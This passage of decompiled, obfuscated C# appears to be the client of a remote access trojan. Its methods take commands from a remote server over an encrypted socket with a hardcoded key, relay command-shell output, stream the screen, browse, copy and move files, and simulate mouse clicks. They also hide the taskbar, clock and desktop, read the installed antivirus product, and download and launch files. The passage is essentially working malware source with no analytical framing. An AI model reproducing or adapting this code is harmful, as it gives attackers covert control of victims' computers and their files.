			smethod_49(stringBuilder4.ToString());
		}
	}

	private static void smethod_18(string string_7, string string_8, string string_9, string string_10)
	{
		if (!Class2.smethod_63(string_10, "dir"))
		{
			if (Class2.smethod_63(string_10, "file"))
			{
				if (Class2.smethod_63(string_9, "1"))
				{
					Class2.smethod_131(string_7, Class2.smethod_68(string_8, "\\", Class2.smethod_128((FileSystemInfo)Class2.smethod_130(string_7))), bool_5: true);
				}
				else if (Class2.smethod_63(string_9, "2"))
				{
					Class2.smethod_83(string_7, Class2.smethod_68(string_8, "\\", Class2.smethod_128((FileSystemInfo)Class2.smethod_130(string_7))));
				}
			}
		}
		else if (Class2.smethod_63(string_9, "1"))
		{
			string string_11 = Class2.smethod_128((FileSystemInfo)Class2.smethod_127(string_7));
			Class2.smethod_129(Class2.smethod_68(string_8, "\\", string_11));
			smethod_29(string_7, Class2.smethod_68(string_8, "\\", string_11), bool_5: true);
		}
		else if (Class2.smethod_63(string_9, "2"))
		{
			string string_12 = Class2.smethod_128((FileSystemInfo)Class2.smethod_127(string_7));
			Class2.smethod_129(Class2.smethod_68(string_8, "\\", string_12));
			smethod_30(string_7, Class2.smethod_68(string_8, "\\", string_12), bool_5: true);
		}
	}

	private static string smethod_19(string string_7)
	{
		string[] array = Class2.smethod_132(string_7);
		string[] array2 = Class2.smethod_133(string_7);
		StringBuilder stringBuilder = Class2.smethod_94();
		Class2.smethod_116(stringBuilder, "fdirl");
		foreach (string text in array)
		{
			Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(stringBuilder, Class2.smethod_134(text, string_7, string.Empty)), "§"), "N/A"), "§").Append(Class2.smethod_135(text).ToString()).Append("§")
				.Append(text)
				.Append("\n");
		}
		foreach (string text2 in array2)
		{
			FileInfo fileInfo = new FileInfo(text2);
			stringBuilder.Append(fileInfo.Name).Append("§").Append(fileInfo.Length.ToString())
				.Append("§")
				.Append(fileInfo.CreationTime.ToString())
				.Append("§")
				.Append(text2)
				.Append("\n");
		}
		return stringBuilder.ToString();
	}

	private static void smethod_20(string string_7, string string_8)
	{
		if (!Class2.smethod_63(string_8, "task"))
		{
			if (!Class2.smethod_63(string_8, "clock"))
			{
				if (!Class2.smethod_63(string_8, "tray"))
				{
					if (!Class2.smethod_63(string_8, "desktop"))
					{
						if (Class2.smethod_63(string_8, "start"))
						{
							if (Class2.smethod_63(string_7, "hide"))
							{
								smethod_40();
							}
							else
							{
								smethod_41();
							}
						}
					}
					else if (Class2.smethod_63(string_7, "hide"))
					{
						smethod_36();
					}
					else
					{
						smethod_37();
					}
				}
				else if (Class2.smethod_63(string_7, "hide"))
				{
					smethod_38();
				}
				else
				{
					smethod_39();
				}
			}
			else if (Class2.smethod_63(string_7, "hide"))
			{
				smethod_32();
			}
			else
			{
				smethod_33();
			}
		}
		else if (Class2.smethod_63(string_7, "hide"))
		{
			smethod_34();
		}
		else
		{
			smethod_35();
		}
	}

	private static void smethod_21(string string_7)
	{
		SystemSound systemSound_ = (Class2.smethod_63(string_7, "0") ? Class2.smethod_136() : (Class2.smethod_63(string_7, "1") ? Class2.smethod_137() : (Class2.smethod_63(string_7, "2") ? Class2.smethod_138() : Class2.smethod_139())));
		Class2.smethod_140(systemSound_);
	}

	private static void smethod_22()
	{
		byte[] array = new byte[2048];
		try
		{
			int num = 0;
			num = (bool_4 ? Class2.smethod_142((Stream)sslStream_0, array, 0, 2048) : Class2.smethod_141(socket_0, array, SocketFlags.None));
			if (num == 0)
			{
				return;
			}
			byte[] array2 = new byte[num];
			Class2.smethod_143((Array)array, (Array)array2, num);
			if (bool_0)
			{
				Class2.smethod_144((Array)array2, 0, (Array)byte_0, int_5, array2.Length);
				int_5 += array2.Length;
				if (int_5 != int_4)
				{
					return;
				}
				FileStream fileStream = Class2.smethod_145(string_0);
				try
				{
					byte[] array3 = byte_0;
					Class2.smethod_146((Stream)fileStream, array3, 0, array3.Length);
				}
				finally
				{
					if (fileStream != null)
					{
						Class2.smethod_74((IDisposable)fileStream);
					}
				}
				Class2.smethod_147((Array)byte_0, 0, byte_0.Length);
				smethod_49("frecv");
				int_5 = 0;
				bool_0 = false;
				return;
			}
			string[] array4 = smethod_16(Class2.smethod_148(encoding_0, array2));
			foreach (string string_ in array4)
			{
				if (!bool_4)
				{
					smethod_17(smethod_48(string_));
				}
				else
				{
					smethod_17(string_);
				}
			}
		}
		catch (Exception)
		{
			Class5.bool_0 = true;
			Class2.smethod_82("Connection ended");
		}
	}

	public static void smethod_23(byte[] byte_1)
	{
		try
		{
			byte[] array = new byte[byte_1.Length + 16];
			byte[] array2 = Class2.smethod_149(Class2.smethod_102(), "rdstream");
			Class2.smethod_144((Array)array2, 0, (Array)array, 0, array2.Length);
			Class2.smethod_144((Array)byte_1, 0, (Array)array, array2.Length, byte_1.Length);
			Class2.smethod_150(socket_0, array, 0, array.Length, SocketFlags.None);
		}
		catch (Exception)
		{
			try
			{
				Class2.smethod_82("Connection Ended");
				Class2.smethod_90(3000);
				bool_1 = true;
			}
			catch (Exception exception_)
			{
				Class2.smethod_82(Class2.smethod_64("Failed to send Screen  original ERROR : ", Class2.smethod_89(exception_)));
				Class2.smethod_90(10000);
				Class2.smethod_151();
			}
		}
	}

	private static void smethod_24(string string_7, string string_8)
	{
		int x = Class2.smethod_152().X;
		int y = Cursor.get_Position().Y;
		if (string_7 == "left")
		{
			if (!(string_8 == "up"))
			{
				smethod_26(Enum2.LEFTDOWN, x, y, 0, 0);
			}
			else
			{
				smethod_25(Enum2.LEFTUP, x, y, 0, 0);
			}
		}
		else if (string_7 == "right")
		{
			if (string_8 == "up")
			{
				smethod_27(Enum2.RIGHTUP, x, y, 0, 0);
			}
			else
			{
				smethod_28(Enum2.RIGHTDOWN, x, y, 0, 0);
			}
		}
	}

	private static void smethod_25(Enum2 enum2_0, int int_7, int int_8, int int_9, int int_10)
	{
		Cursor.set_Position(new Point(int_7, int_8));
		mouse_event(4, int_7, int_8, int_9, int_10);
	}

	private static void smethod_26(Enum2 enum2_0, int int_7, int int_8, int int_9, int int_10)
	{
		Cursor.set_Position(new Point(int_7, int_8));
		mouse_event(2, int_7, int_8, int_9, int_10);
	}

	private static void smethod_27(Enum2 enum2_0, int int_7, int int_8, int int_9, int int_10)
	{
		Cursor.set_Position(new Point(int_7, int_8));
		mouse_event(16, int_7, int_8, int_9, int_10);
	}

	private static void smethod_28(Enum2 enum2_0, int int_7, int int_8, int int_9, int int_10)
	{
		Cursor.set_Position(new Point(int_7, int_8));
		mouse_event(8, int_7, int_8, int_9, int_10);
	}

	private static void smethod_29(string string_7, string string_8, bool bool_5)
	{
		DirectoryInfo directoryInfo = Class2.smethod_127(string_7);
		DirectoryInfo[] array = Class2.smethod_153(directoryInfo);
		if (!Class2.smethod_154((FileSystemInfo)directoryInfo))
		{
			throw Class2.smethod_155(Class2.smethod_64("Source directory does not exist or could not be found: ", string_7));
		}
		if (!Class2.smethod_156(string_8))
		{
			Class2.smethod_129(string_8);
		}
		FileInfo[] array2 = Class2.smethod_157(directoryInfo);
		foreach (FileInfo fileInfo in array2)
		{
			string string_9 = Class2.smethod_60(string_8, Class2.smethod_128((FileSystemInfo)fileInfo));
			Class2.smethod_158(fileInfo, string_9, bool_5: false);
		}
		if (bool_5)
		{
			DirectoryInfo[] array3 = array;
			foreach (DirectoryInfo fileSystemInfo_ in array3)
			{
				string string_10 = Class2.smethod_60(string_8, Class2.smethod_128((FileSystemInfo)fileSystemInfo_));
				smethod_29(Class2.smethod_159((FileSystemInfo)fileSystemInfo_), string_10, bool_5);
			}
		}
	}

	private static void smethod_30(string string_7, string string_8, bool bool_5)
	{
		DirectoryInfo directoryInfo = Class2.smethod_127(string_7);
		DirectoryInfo[] array = Class2.smethod_153(directoryInfo);
		if (!Class2.smethod_154((FileSystemInfo)directoryInfo))
		{
			throw Class2.smethod_155(Class2.smethod_64("Source directory does not exist or could not be found: ", string_7));
		}
		if (!Class2.smethod_156(string_8))
		{
			Class2.smethod_129(string_8);
		}
		FileInfo[] array2 = Class2.smethod_157(directoryInfo);
		foreach (FileInfo fileInfo in array2)
		{
			string string_9 = Class2.smethod_60(string_8, Class2.smethod_128((FileSystemInfo)fileInfo));
			Class2.smethod_160(fileInfo, string_9);
		}
		if (bool_5)
		{
			DirectoryInfo[] array3 = array;
			foreach (DirectoryInfo fileSystemInfo_ in array3)
			{
				string string_10 = Class2.smethod_60(string_8, Class2.smethod_128((FileSystemInfo)fileSystemInfo_));
				smethod_30(Class2.smethod_159((FileSystemInfo)fileSystemInfo_), string_10, bool_5);
			}
		}
	}

	private static void smethod_31()
	{
		Class2.smethod_162(Class2.smethod_161(), (Action)delegate
		{
			try
			{
				string text2 = "";
				while ((text2 = Class3.smethod_4((TextReader)streamReader_0)) != null)
				{
					smethod_49(Class3.smethod_3("cmdout§", text2));
				}
			}
			catch (Exception exception_2)
			{
				smethod_49(Class3.smethod_3("cmdout§Error reading cmd response: \n", Class3.smethod_5(exception_2)));
				smethod_15(Enum1.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!");
			}
		});
		Class2.smethod_162(Class2.smethod_161(), (Action)delegate
		{
			try
			{
				string text = "";
				while ((text = Class3.smethod_4((TextReader)streamReader_1)) != null)
				{
					smethod_49(Class3.smethod_3("cmdout§", text));
				}
			}
			catch (Exception exception_)
			{
				smethod_49(Class3.smethod_3("cmdout§Error reading cmd response: \n", Class3.smethod_5(exception_)));
				smethod_15(Enum1.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!");
			}
		});
	}

	public static void smethod_32()
	{
		ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), 0, "TrayNotifyWnd", null), 0, "TrayClockWClass", null), 0);
	}

	public static void smethod_33()
	{
		ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), 0, "TrayNotifyWnd", null), 0, "TrayClockWClass", null), 1);
	}

	public static void smethod_34()
	{
		ShowWindow(FindWindow("Shell_TrayWnd", null), 0);
	}

	public static void smethod_35()
	{
		ShowWindow(FindWindow("Shell_TrayWnd", null), 1);
	}

	public static void smethod_36()
	{
		ShowWindow(FindWindow(null, "Program Manager"), 0);
	}

	public static void smethod_37()
	{
		ShowWindow(FindWindow(null, "Program Manager"), 1);
	}

	public static void smethod_38()
	{
		ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), 0, "TrayNotifyWnd", null), 0);
	}

	public static void smethod_39()
	{
		ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), 0, "TrayNotifyWnd", null), 1);
	}

	public static void smethod_40()
	{
		ShowWindow(FindWindow("Button", null), 0);
	}

	public static void smethod_41()
	{
		ShowWindow(FindWindow("Button", null), 1);
	}

	private static void smethod_42(string string_7)
	{
		SpeechSynthesizer val = Class2.smethod_163();
		try
		{
			Class2.smethod_164(val);
			Class2.smethod_165(val, string_7);
		}
		finally
		{
			if (val != null)
			{
				Class2.smethod_74((IDisposable)val);
			}
		}
	}

	private static void smethod_43(int int_7, int int_8)
	{
		Class2.smethod_166(int_7, int_8 * 1000);
	}

	private static void smethod_44(string[] string_7)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		string string_8 = string_7[1];
		string string_9 = string_7[2];
		string string_10 = string_7[3];
		string string_11 = string_7[4];
		MessageBoxIcon messageBoxIcon_ = (Class2.smethod_63(string_10, "1") ? ((MessageBoxIcon)16) : (Class2.smethod_63(string_10, "2") ? ((MessageBoxIcon)48) : (Class2.smethod_63(string_10, "3") ? ((MessageBoxIcon)64) : (Class2.smethod_63(string_10, "4") ? ((MessageBoxIcon)32) : ((MessageBoxIcon)0)))));
		MessageBoxButtons messageBoxButtons_ = (Class2.smethod_63(string_11, "1") ? ((MessageBoxButtons)4) : (Class2.smethod_63(string_11, "2") ? ((MessageBoxButtons)3) : (Class2.smethod_63(string_11, "3") ? ((MessageBoxButtons)2) : ((!Class2.smethod_63(string_11, "4")) ? ((MessageBoxButtons)0) : ((MessageBoxButtons)1)))));
		Class2.smethod_167(string_9, string_8, messageBoxButtons_, messageBoxIcon_);
	}

	public static string smethod_45()
	{
		if (Class2.smethod_81(string_3, string.Empty))
		{
			return string_3;
		}
		IPAddress[] array = Class2.smethod_170(Class2.smethod_169(Class2.smethod_168()));
		foreach (IPAddress iPAddress in array)
		{
			if (Class2.smethod_171(iPAddress) == AddressFamily.InterNetwork)
			{
				string_3 = Class2.smethod_96((object)iPAddress);
				return Class2.smethod_96((object)iPAddress);
			}
		}
		return "N/A";
	}

	public static string smethod_46()
	{
		if (Class2.smethod_81(string_4, string.Empty))
		{
			return string_4;
		}
		ManagementObjectCollection managementObjectCollection_ = Class2.smethod_173(Class2.smethod_172(Class2.smethod_68("\\\\", Class2.smethod_126(), "\\root\\SecurityCenter2"), "SELECT * FROM AntivirusProduct"));
		string text = "";
		ManagementObjectEnumerator val = Class2.smethod_174(managementObjectCollection_);
		try
		{
			while (Class2.smethod_177(val))
			{
				text = Class2.smethod_96(Class2.smethod_176(Class2.smethod_175(val), "displayName"));
			}
		}
		finally
		{
			if (val != null)
			{
				Class2.smethod_74((IDisposable)val);
			}
		}
		if (Class2.smethod_63(text, ""))
		{
			text = "N/A";
		}
		string_4 = text;
		return text;
	}

	public static string smethod_47(string string_7)
	{
		try
		{
			string string_8 = "MAKV2SPBNI99212";
			byte[] array = Class2.smethod_149(Class2.smethod_102(), string_7);
			Aes aes = Class2.smethod_178();
			try
			{
				byte[] array2 = new byte[13];
				Class2.smethod_179((Array)array2, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				Rfc2898DeriveBytes deriveBytes_ = Class2.smethod_180(string_8, array2);
				Class2.smethod_182((SymmetricAlgorithm)aes, Class2.smethod_181((DeriveBytes)deriveBytes_, 32));
				Class2.smethod_183((SymmetricAlgorithm)aes, Class2.smethod_181((DeriveBytes)deriveBytes_, 16));
				MemoryStream memoryStream = Class2.smethod_184();
				try
				{
					CryptoStream cryptoStream = Class2.smethod_186((Stream)memoryStream, Class2.smethod_185((SymmetricAlgorithm)aes), CryptoStreamMode.Write);
					try
					{
						Class2.smethod_146((Stream)cryptoStream, array, 0, array.Length);
						Class2.smethod_187((Stream)cryptoStream);
					}
					finally
					{
						if (cryptoStream != null)
						{
							Class2.smethod_74((IDisposable)cryptoStream);
						}
					}
					string_7 = Class2.smethod_189(Class2.smethod_188(memoryStream));
				}
				finally
				{
					if (memoryStream != null)
					{
						Class2.smethod_74((IDisposable)memoryStream);
					}
				}
			}
			finally
			{
				if (aes != null)
				{
					Class2.smethod_74((IDisposable)aes);
				}
			}
			return string_7;
		}
		catch (Exception)
		{
			smethod_15(Enum1.ENCRYPT_DATA_CORRUPTED, "Can't encrypt message!", "Message encryption failed!");
			return string_7;
		}
	}

	public static string smethod_48(string string_7)
	{
		try
		{
			string string_8 = "MAKV2SPBNI99212";
			byte[] array = Class2.smethod_190(string_7);
			Aes aes = Class2.smethod_178();
			try
			{
				byte[] array2 = new byte[13];
				Class2.smethod_179((Array)array2, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				Rfc2898DeriveBytes deriveBytes_ = Class2.smethod_180(string_8, array2);
				Class2.smethod_182((SymmetricAlgorithm)aes, Class2.smethod_181((DeriveBytes)deriveBytes_, 32));
				Class2.smethod_183((SymmetricAlgorithm)aes, Class2.smethod_181((DeriveBytes)deriveBytes_, 16));
				MemoryStream memoryStream = Class2.smethod_184();
				try
				{
					CryptoStream cryptoStream = Class2.smethod_186((Stream)memoryStream, Class2.smethod_191((SymmetricAlgorithm)aes), CryptoStreamMode.Write);
					try
					{
						Class2.smethod_146((Stream)cryptoStream, array, 0, array.Length);
						Class2.smethod_187((Stream)cryptoStream);
					}
					finally
					{
						if (cryptoStream != null)
						{
							Class2.smethod_74((IDisposable)cryptoStream);
						}
					}
					string_7 = Class2.smethod_148(Class2.smethod_102(), Class2.smethod_188(memoryStream));
				}
				finally
				{
					if (memoryStream != null)
					{
						Class2.smethod_74((IDisposable)memoryStream);
					}
				}
			}
			finally
			{
				if (aes != null)
				{
					Class2.smethod_74((IDisposable)aes);
				}
			}
			return string_7;
		}
		catch (Exception exception_)
		{
			Class2.smethod_82(Class2.smethod_89(exception_));
			Class2.smethod_82(Class2.smethod_64("Cipher Text: ", string_7));
			smethod_15(Enum1.DECRYPT_DATA_CORRUPTED, "Can't decrypt message!", "Message decryption failed!");
			return "error";
		}
	}

	private static void smethod_49(string string_7)
	{
		if (!Class2.smethod_107(socket_0))
		{
			Class2.smethod_82("Socket is not connected!");
			return;
		}
		string_7 = (bool_4 ? smethod_51(string_7) : smethod_47(string_7));
		byte[] byte_ = Class2.smethod_149(encoding_0, string_7);
		try
		{
			if (!bool_4)
			{
				Class2.smethod_192(socket_0, byte_);
			}
			else
			{
				Class2.smethod_193(sslStream_0, byte_);
			}
		}
		catch (Exception exception_)
		{
			Class2.smethod_82(Class2.smethod_64("Send Command Failure ", Class2.smethod_89(exception_)));
		}
	}

	private static int smethod_50(string string_7)
	{
		int num = 0;
		for (int i = 0; i < string_7.Length; i++)
		{
			num += Class2.smethod_101().GetByteCount(Class2.smethod_99(string_7, i).ToString());
		}
		return num;
	}

	private static string smethod_51(string string_7)
	{
		string_7 = Class2.smethod_134(string_7, "\\", "\\\\");
		return smethod_50(string_7) + "!??!%" + string_7;
	}

	private static void smethod_52(byte[] byte_1)
	{
		if (!Class2.smethod_107(socket_0))
		{
			Class2.smethod_82("Socket is not connected!");
			return;
		}
		try
		{
			if (!bool_4)
			{
				Class2.smethod_192(socket_0, byte_1);
			}
			else
			{
				Class2.smethod_193(sslStream_0, byte_1);
			}
		}
		catch (Exception exception_)
		{
			Class2.smethod_82(Class2.smethod_64("Send Byte Failure ", Class2.smethod_89(exception_)));
		}
	}

	static Delegate smethod_53(Delegate delegate_0, Delegate delegate_1)
	{
		return Delegate.Combine(delegate_0, delegate_1);
	}

	static void smethod_54(bool bool_5)
	{
		ServicePointManager.UseNagleAlgorithm = bool_5;
	}

	static RegistryKey smethod_55(RegistryKey registryKey_0, string string_7, bool bool_5)
	{
		return registryKey_0.OpenSubKey(string_7, bool_5);
	}

	static Assembly smethod_56()
	{
		return Assembly.GetExecutingAssembly();
	}

	static string smethod_57(Assembly assembly_0)
	{
		return assembly_0.Location;
	}

	static void smethod_58(string string_7, string string_8)
	{
		File.Copy(string_7, string_8);
	}

	static string smethod_59(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	static string smethod_60(string string_7, string string_8)
	{
		return Path.Combine(string_7, string_8);
	}

	static void smethod_61(RegistryKey registryKey_0, string string_7, object object_0)
	{
		registryKey_0.SetValue(string_7, object_0);
	}

	static Assembly smethod_62()
	{
		return Assembly.GetCallingAssembly();
	}

	static bool smethod_63(string string_7, string string_8)
	{
		return string_7 == string_8;
	}

	static string smethod_64(string string_7, string string_8)
	{
		return string_7 + string_8;
	}

	static string smethod_65(string string_7, string string_8, string string_9, string string_10)
	{
		return string_7 + string_8 + string_9 + string_10;
	}

	static Stream smethod_66(Assembly assembly_0, string string_7)
	{
		return assembly_0.GetManifestResourceStream(string_7);
	}

	static BinaryReader smethod_67(Stream stream_0)
	{
		return new BinaryReader(stream_0);
	}

	static string smethod_68(string string_7, string string_8, string string_9)
	{
		return string_7 + string_8 + string_9;
	}

	static FileStream smethod_69(string string_7, FileMode fileMode_0)
	{
		return new FileStream(string_7, fileMode_0);
	}

	static BinaryWriter smethod_70(Stream stream_0)
	{
		return new BinaryWriter(stream_0);
	}

	static long smethod_71(Stream stream_0)
	{
		return stream_0.Length;
	}

	static byte[] smethod_72(BinaryReader binaryReader_0, int int_7)
	{
		return binaryReader_0.ReadBytes(int_7);
	}

	static void smethod_73(BinaryWriter binaryWriter_0, byte[] byte_1)
	{
		binaryWriter_0.Write(byte_1);
	}

	static void smethod_74(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static string smethod_75()
	{
		return Application.get_StartupPath();
	}

	static bool smethod_76(string string_7)
	{
		return File.Exists(string_7);
	}

	static void smethod_77(string string_7)
	{
		File.Delete(string_7);
	}

	static Stream smethod_78(WebClient webClient_0, string string_7)
	{
		return webClient_0.OpenRead(string_7);
	}

	static StreamReader smethod_79(Stream stream_0)
	{
		return new StreamReader(stream_0);
	}

	static string smethod_80(TextReader textReader_0)
	{
		return textReader_0.ReadToEnd();
	}

	static bool smethod_81(string string_7, string string_8)
	{
		return string_7 != string_8;
	}

	static void smethod_82(string string_7)
	{
		Console.WriteLine(string_7);
	}

	static void smethod_83(string string_7, string string_8)
	{
		File.Move(string_7, string_8);
	}

	static void smethod_84(WebClient webClient_0, string string_7, string string_8)
	{
		webClient_0.DownloadFile(string_7, string_8);
	}

	static Process smethod_85(string string_7)
	{
		return Process.Start(string_7);
	}

	static void smethod_86(int int_7)
	{
		Environment.Exit(int_7);
	}

	static Thread smethod_87(ThreadStart threadStart_0)
	{
		return new Thread(threadStart_0);
	}

	static void smethod_88(Thread thread_0)
	{
		thread_0.Start();
	}

	static string smethod_89(Exception exception_0)
	{
		return exception_0.Message;
	}

	static void smethod_90(int int_7)
	{
		Thread.Sleep(int_7);
	}

	static MD5CryptoServiceProvider smethod_91()
	{
		return new MD5CryptoServiceProvider();
	}

	static byte[] smethod_92(string string_7)
	{
		return File.ReadAllBytes(string_7);
	}

	static byte[] smethod_93(HashAlgorithm hashAlgorithm_0, byte[] byte_1)
	{
		return hashAlgorithm_0.ComputeHash(byte_1);
	}

	static StringBuilder smethod_94()
	{
		return new StringBuilder();
	}

	static IPAddress[] smethod_95(string string_7)
	{
		return Dns.GetHostAddresses(string_7);
	}

	static string smethod_96(object object_0)
	{
		return object_0.ToString();
	}

	static bool smethod_97(string string_7, string string_8)
	{
		return string_7.Contains(string_8);
	}

	static string[] smethod_98(string string_7, char[] char_0)
	{
		return string_7.Split(char_0);
	}

	static char smethod_99(string string_7, int int_7)
	{
		return string_7[int_7];
	}

	static int smethod_100(string string_7)
	{
		return string_7.Length;
	}

	static Encoding smethod_101()
	{
		return Encoding.UTF8;
	}

	static Encoding smethod_102()
	{
		return Encoding.Unicode;
	}

	static string smethod_103(object object_0, object object_1)
	{
		return string.Concat(object_0, object_1);
	}

	static IPAddress smethod_104(string string_7)
	{
		return IPAddress.Parse(string_7);
	}

	static void smethod_105(Socket socket_1, IPAddress ipaddress_0, int int_7)
	{
		socket_1.Connect(ipaddress_0, int_7);
	}

	static void smethod_106()
	{
		Console.Clear();
	}

	static bool smethod_107(Socket socket_1)
	{
		return socket_1.Connected;
	}

	static NetworkStream smethod_108(Socket socket_1)
	{
		return new NetworkStream(socket_1);
	}

	static SslStream smethod_109(Stream stream_0, bool bool_5, RemoteCertificateValidationCallback remoteCertificateValidationCallback_0, LocalCertificateSelectionCallback localCertificateSelectionCallback_0)
	{
		return new SslStream(stream_0, bool_5, remoteCertificateValidationCallback_0, localCertificateSelectionCallback_0);
	}

	static void smethod_110(SslStream sslStream_1, string string_7)
	{
		sslStream_1.AuthenticateAsClient(string_7);
	}

	static void smethod_111(Socket socket_1, SocketShutdown socketShutdown_0)
	{
		socket_1.Shutdown(socketShutdown_0);
	}

	static void smethod_112(Socket socket_1)
	{
		socket_1.Close();
	}

	static Socket smethod_113(AddressFamily addressFamily_0, SocketType socketType_0, ProtocolType protocolType_0)
	{
		return new Socket(addressFamily_0, socketType_0, protocolType_0);
	}

	static Task smethod_114(Action action_0)
	{
		return new Task(action_0);
	}

	static void smethod_115(Task task_0)
	{
		task_0.Start();
	}

	static StringBuilder smethod_116(StringBuilder stringBuilder_0, string string_7)
	{
		return stringBuilder_0.Append(string_7);
	}

	static StringBuilder smethod_117(StringBuilder stringBuilder_0, object object_0)
	{
		return stringBuilder_0.Append(object_0);
	}

	static string smethod_118(string string_7, int int_7, int int_8)
	{
		return string_7.Substring(int_7, int_8);
	}

	static Process smethod_119()
	{
		return new Process();
	}

	static ProcessStartInfo smethod_120(Process process_1)
	{
		return process_1.StartInfo;
	}

	static void smethod_121(ProcessStartInfo processStartInfo_0, string string_7)
	{
		processStartInfo_0.FileName = string_7;
	}

	static void smethod_122(ProcessStartInfo processStartInfo_0, bool bool_5)
	{
		processStartInfo_0.CreateNoWindow = bool_5;
	}

	static bool smethod_123(Process process_1)
	{
		return process_1.Start();
	}

	static bool smethod_124(string string_7, string string_8)
	{
		return string_7.StartsWith(string_8);
	}

	static string smethod_125(string string_7, int int_7)
	{
		return string_7.Substring(int_7);
	}

	static string smethod_126()
	{
		return Environment.MachineName;
	}

	static DirectoryInfo smethod_127(string string_7)
	{
		return new DirectoryInfo(string_7);
	}

	static string smethod_128(FileSystemInfo fileSystemInfo_0)
	{
		return fileSystemInfo_0.Name;
	}

	static DirectoryInfo smethod_129(string string_7)
	{
		return Directory.CreateDirectory(string_7);
	}

	static FileInfo smethod_130(string string_7)
	{
		return new FileInfo(string_7);
	}

	static void smethod_131(string string_7, string string_8, bool bool_5)
	{
		File.Copy(string_7, string_8, bool_5);
	}

	static string[] smethod_132(string string_7)
	{
		return Directory.GetDirectories(string_7);
	}

	static string[] smethod_133(string string_7)
	{
		return Directory.GetFiles(string_7);
	}

	static string smethod_134(string string_7, string string_8, string string_9)
	{
		return string_7.Replace(string_8, string_9);
	}

	static DateTime smethod_135(string string_7)
	{
		return Directory.GetCreationTime(string_7);
	}

	static SystemSound smethod_136()
	{
		return SystemSounds.get_Beep();
	}

	static SystemSound smethod_137()
	{
		return SystemSounds.get_Hand();
	}

	static SystemSound smethod_138()
	{
		return SystemSounds.get_Exclamation();
	}

	static SystemSound smethod_139()
	{
		return SystemSounds.get_Asterisk();
	}

	static void smethod_140(SystemSound systemSound_0)
	{
		systemSound_0.Play();
	}

	static int smethod_141(Socket socket_1, byte[] byte_1, SocketFlags socketFlags_0)
	{
		return socket_1.Receive(byte_1, socketFlags_0);
	}

	static int smethod_142(Stream stream_0, byte[] byte_1, int int_7, int int_8)
	{
		return stream_0.Read(byte_1, int_7, int_8);
	}

	static void smethod_143(Array array_0, Array array_1, int int_7)
	{
		Array.Copy(array_0, array_1, int_7);
	}

	static void smethod_144(Array array_0, int int_7, Array array_1, int int_8, int int_9)
	{
		Buffer.BlockCopy(array_0, int_7, array_1, int_8, int_9);
	}

	static FileStream smethod_145(string string_7)
	{
		return File.Create(string_7);
	}

	static void smethod_146(Stream stream_0, byte[] byte_1, int int_7, int int_8)
	{
		stream_0.Write(byte_1, int_7, int_8);
	}

	static void smethod_147(Array array_0, int int_7, int int_8)
	{
		Array.Clear(array_0, int_7, int_8);
	}

	static string smethod_148(Encoding encoding_1, byte[] byte_1)
	{
		return encoding_1.GetString(byte_1);
	}

	static byte[] smethod_149(Encoding encoding_1, string string_7)
	{
		return encoding_1.GetBytes(string_7);
	}

	static int smethod_150(Socket socket_1, byte[] byte_1, int int_7, int int_8, SocketFlags socketFlags_0)
	{
		return socket_1.Send(byte_1, int_7, int_8, socketFlags_0);
	}

	static void smethod_151()
	{
		Application.Restart();
	}

	static Point smethod_152()
	{
		return Cursor.get_Position();
	}

	static DirectoryInfo[] smethod_153(DirectoryInfo directoryInfo_0)
	{
		return directoryInfo_0.GetDirectories();
	}

	static bool smethod_154(FileSystemInfo fileSystemInfo_0)
	{
		return fileSystemInfo_0.Exists;
	}

	static DirectoryNotFoundException smethod_155(string string_7)
	{
		return new DirectoryNotFoundException(string_7);
	}

	static bool smethod_156(string string_7)
	{
		return Directory.Exists(string_7);
	}

	static FileInfo[] smethod_157(DirectoryInfo directoryInfo_0)
	{
		return directoryInfo_0.GetFiles();
	}

	static FileInfo smethod_158(FileInfo fileInfo_0, string string_7, bool bool_5)
	{
		return fileInfo_0.CopyTo(string_7, bool_5);
	}

	static string smethod_159(FileSystemInfo fileSystemInfo_0)
	{
		return fileSystemInfo_0.FullName;
	}

	static void smethod_160(FileInfo fileInfo_0, string string_7)
	{
		fileInfo_0.MoveTo(string_7);
	}

	static TaskFactory smethod_161()
	{
		return Task.Factory;
	}

	static Task smethod_162(TaskFactory taskFactory_0, Action action_0)
	{
		return taskFactory_0.StartNew(action_0);
	}

	static SpeechSynthesizer smethod_163()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new SpeechSynthesizer();
	}

	static void smethod_164(SpeechSynthesizer speechSynthesizer_0)
	{
		speechSynthesizer_0.SetOutputToDefaultAudioDevice();
	}

	static void smethod_165(SpeechSynthesizer speechSynthesizer_0, string string_7)
	{
		speechSynthesizer_0.Speak(string_7);
	}

	static void smethod_166(int int_7, int int_8)
	{
		Console.Beep(int_7, int_8);
	}

	static DialogResult smethod_167(string string_7, string string_8, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
